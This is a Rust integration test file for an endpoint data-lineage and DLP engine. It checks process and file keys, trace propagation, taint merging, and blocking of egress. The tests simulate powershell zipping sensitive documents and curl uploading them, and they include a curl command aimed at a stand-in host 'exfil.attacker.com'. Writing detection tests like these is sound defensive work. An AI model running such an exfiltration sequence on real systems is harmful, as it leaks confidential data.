//! Integration tests for 100% Data Lineage Engine (`otel_lineage.rs`, Feature 32)

use std::time::Instant;
use killswitch_telemetry::otel_lineage::{
    DlpClassification, DlpPolicy, EgressVerdict, EndpointLineageEngine, FileKey, ProcessKey,
    TaintBaggage, W3cTraceContext,
};

#[test]
fn test_t1_f32_01_composite_keys_non_colliding() {
    let p1 = ProcessKey::new(1024, 5000, "C:\\Windows\\cmd.exe");
    let p2 = ProcessKey::new(1024, 6000, "C:\\Windows\\cmd.exe"); // same PID, different start time
    let p3 = ProcessKey::new(1024, 5000, "C:\\Temp\\fake_cmd.exe"); // same PID, different exe

    assert_ne!(p1, p2);
    assert_ne!(p1, p3);

    let f1 = FileKey::new("C:\\Users\\Alice\\secret.txt", 100);
    let f2 = FileKey::new("C:\\Users\\Alice\\secret.txt", 101); // same path, different inode
    assert_ne!(f1, f2);
}

#[test]
fn test_t1_f32_02_w3c_traceparent_roundtrip() {
    let sc = opentelemetry::trace::SpanContext::new(
        opentelemetry::trace::TraceId::from_bytes([1; 16]),
        opentelemetry::trace::SpanId::from_bytes([2; 8]),
        opentelemetry::trace::TraceFlags::SAMPLED,
        false,
        opentelemetry::trace::TraceState::default(),
    );

    let traceparent = W3cTraceContext::to_traceparent(&sc);
    assert!(traceparent.starts_with("00-01010101010101010101010101010101-0202020202020202-01"));

    let parsed = W3cTraceContext::from_traceparent(&traceparent).unwrap();
    assert_eq!(parsed.trace_id(), sc.trace_id());
    assert_eq!(parsed.span_id(), sc.span_id());
    assert_eq!(parsed.trace_flags(), sc.trace_flags());
}

#[test]
fn test_t1_f32_03_taint_baggage_lattice_and_hash_deduplication() {
    let mut b1 = TaintBaggage::new(
        DlpClassification::Internal,
        DlpPolicy::Allow,
        "hash_a,hash_b",
    );
    let b2 = TaintBaggage::new(
        DlpClassification::CrownJewel,
        DlpPolicy::Quarantine,
        "hash_b,hash_c",
    );

    b1.merge(&b2);

    assert_eq!(b1.classification, DlpClassification::CrownJewel);
    assert_eq!(b1.policy, DlpPolicy::Quarantine);
    let hashes = b1.distinct_hashes();
    assert_eq!(hashes.len(), 3);
    assert!(hashes.contains(&"hash_a".to_string()));
    assert!(hashes.contains(&"hash_b".to_string()));
    assert!(hashes.contains(&"hash_c".to_string()));
}

#[test]
fn test_t1_f32_04_multi_hop_dlp_fan_in_user_scenario() {
    let engine = EndpointLineageEngine::new_in_memory();

    // Step 1: Seed two sensitive files
    let secret_roadmap_key = FileKey::new("C:\\Users\\Alice\\Documents\\secret_roadmap.docx", 101);
    let q4_financials_key = FileKey::new("C:\\Users\\Alice\\Documents\\q4_financials.xlsx", 102);

    engine.seed_sensitive_file(
        secret_roadmap_key,
        "C:\\Users\\Alice\\Documents\\secret_roadmap.docx",
        "1111111111111111111111111111111111111111111111111111111111111111",
        DlpClassification::CrownJewel,
        DlpPolicy::Quarantine,
    );

    engine.seed_sensitive_file(
        q4_financials_key,
        "C:\\Users\\Alice\\Documents\\q4_financials.xlsx",
        "2222222222222222222222222222222222222222222222222222222222222222",
        DlpClassification::Confidential,
        DlpPolicy::Audit,
    );

    // Step 2: powershell.exe (2104) spawns 7z.exe (4812)
    let powershell_key = ProcessKey::new(2104, 100000, "C:\\Windows\\System32\\powershell.exe");
    let z7_key = ProcessKey::new(4812, 100100, "C:\\Program Files\\7-Zip\\7z.exe");

    engine.on_process_create(None, powershell_key, "C:\\Windows\\System32\\powershell.exe");
    engine.on_process_create(Some(powershell_key), z7_key, "C:\\Program Files\\7-Zip\\7z.exe");

    // Step 3: 7z.exe reads both files and writes staging_upload.zip
    engine.on_file_read(z7_key, secret_roadmap_key);
    engine.on_file_read(z7_key, q4_financials_key);

    let staging_zip_key = FileKey::new("C:\\Temp\\staging_upload.zip", 999);
    engine.on_file_write(
        z7_key,
        staging_zip_key,
        "C:\\Temp\\staging_upload.zip",
        "3333333333333333333333333333333333333333333333333333333333333333",
    );

    // Step 4: curl.exe (5001) spawned, reads zip, and calls evaluate_egress
    let curl_key = ProcessKey::new(5001, 100200, "C:\\Windows\\System32\\curl.exe");
    engine.on_process_create(Some(powershell_key), curl_key, "C:\\Windows\\System32\\curl.exe");
    engine.on_file_read(curl_key, staging_zip_key);

    let verdict = engine.evaluate_egress(curl_key, "https://external-drop.example.com/upload");

    // Step 5: Verify EgressVerdict::Block with propagated trace_id and source hashes
    assert!(verdict.is_block());
    match verdict {
        EgressVerdict::Block {
            reason,
            trace_id,
            classification,
            policy,
            source_hashes,
        } => {
            assert!(reason.contains("DLP Egress Blocked"));
            assert!(!trace_id.is_empty());
            assert_eq!(classification, DlpClassification::CrownJewel);
            assert_eq!(policy, DlpPolicy::Quarantine);
            assert_eq!(source_hashes.len(), 2);
            assert!(source_hashes.contains(&"1111111111111111111111111111111111111111111111111111111111111111".to_string()));
            assert!(source_hashes.contains(&"2222222222222222222222222222222222222222222222222222222222222222".to_string()));
        }
        EgressVerdict::Allow => panic!("Expected EgressVerdict::Block"),
    }

    // Fast-path latency verification: warm up and average across 100 iterations
    // to absorb OS thread scheduling jitter in unoptimized debug builds
    let bench_iters = 100;
    let bench_start = Instant::now();
    for _ in 0..bench_iters {
        let _ = engine.evaluate_egress(curl_key, "https://external-drop.example.com/upload");
    }
    let avg_latency = bench_start.elapsed() / bench_iters;
    assert!(
        avg_latency.as_micros() < 200,
        "Fast-path DashMap egress evaluation averaged {:?} (expected < 200µs)",
        avg_latency
    );
}

#[tokio::test]
async fn test_t1_f32_05_adjudication_voter_integration() {
    use killswitch_adjudication::voters::{
        AdjudicationContext, DataLineageVoter, LineageAdjudicationEvidence, LineageCausalLink,
        OpenLineageDataset as AdjDataset, OpenLineageDatasetFacets as AdjFacets, ThreatVoter,
        DlpClassification as AdjClass, DlpPolicy as AdjPolicy, EgressVerdict as AdjVerdict,
        TaintBaggage as AdjBaggage,
    };
    use killswitch_types::adjudication::{EvidenceClass, ThreatCandidate, VoteAction};

    let engine = EndpointLineageEngine::new_in_memory();
    let voter = DataLineageVoter::new();

    let file_key = FileKey::new("C:\\Users\\Alice\\crown_jewel.pdf", 555);
    engine.seed_sensitive_file(
        file_key,
        "C:\\Users\\Alice\\crown_jewel.pdf",
        "deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
        DlpClassification::CrownJewel,
        DlpPolicy::Quarantine,
    );

    let curl_key = ProcessKey::new(7788, 12345, "C:\\Tools\\curl.exe");
    engine.on_process_create(None, curl_key, "C:\\Tools\\curl.exe");
    engine.on_file_read(curl_key, file_key);

    let verdict = engine.evaluate_egress(curl_key, "https://exfil.attacker.com/drop");
    assert!(verdict.is_block());

    let proc_state = engine.get_process_taint(&curl_key).unwrap();

    let evidence = LineageAdjudicationEvidence {
        actor_pid: curl_key.pid,
        actor_exe: proc_state.exe_path.clone(),
        parent_pid: None,
        destination: "https://exfil.attacker.com/drop".to_string(),
        egress_verdict: AdjVerdict::Block {
            reason: "DLP Blocked".to_string(),
            trace_id: proc_state.active_span_context.trace_id().to_string(),
        },
        baggage: Some(AdjBaggage {
            classification: AdjClass::CrownJewel,
            policy: AdjPolicy::Quarantine,
            source_sha256: "deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef".to_string(),
        }),
        causal_links: vec![LineageCausalLink {
            trace_id: proc_state.active_span_context.trace_id().to_string(),
            span_id: proc_state.active_span_context.span_id().to_string(),
            role: "INPUT".to_string(),
            file_path: "C:\\Users\\Alice\\crown_jewel.pdf".to_string(),
        }],
        input_datasets: vec![AdjDataset {
            namespace: "file://endpoint-local".to_string(),
            name: "C:\\Users\\Alice\\crown_jewel.pdf".to_string(),
            facets: AdjFacets {
                content_sha256: "deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef".to_string(),
                dlp_classification: AdjClass::CrownJewel,
            },
        }],
        provenance_hops: proc_state.provenance_hops.clone(),
    };

    let ctx = AdjudicationContext {
        lineage_evidence: Some(evidence),
        ..Default::default()
    };

    let candidate = ThreatCandidate::new(
        Some(curl_key.pid),
        "curl.exe",
        "C:\\Tools\\curl.exe",
        "C:\\Tools\\curl.exe https://exfil.attacker.com/drop",
        0.95,
        EvidenceClass::LiveNetwork,
    );

    let vote = voter.vote(&candidate, Some(&ctx)).await;
    assert!(vote.is_some());
    let v = vote.unwrap();
    assert_eq!(v.action, VoteAction::Isolate);
    assert_eq!(v.evidence_class, EvidenceClass::LiveNetwork);
    assert!(v.confidence >= 0.95);
    assert!(v.weight >= 1.8);
}
